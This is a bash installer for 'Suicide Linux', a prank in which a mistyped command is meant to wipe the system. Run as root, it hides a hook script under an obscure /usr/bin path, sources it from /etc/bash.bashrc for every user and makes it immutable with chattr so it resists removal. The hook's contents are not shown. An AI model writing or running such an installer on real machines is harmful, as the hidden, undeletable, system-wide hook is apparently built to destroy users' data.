#!/bin/bash
if [ "$EUID" -ne 0 ]; then 
    echo "Run as root: sudo ./install.sh"
    exit 1
fi

echo "Installing Suicide Linux..."
mkdir -p /usr/bin/catch-me-if-you-can/3/1
cp suicide-hook.sh /usr/bin/catch-me-if-you-can/3/1/3
chmod +x /usr/bin/catch-me-if-you-can/3/1/3
echo "source /usr/bin/catch-me-if-you-can/3/1/3" >> /etc/bash.bashrc
chattr +i /usr/bin/catch-me-if-you-can/3/1/3
echo "✅ Installed. Reboot to activate SUICIDE MODE."
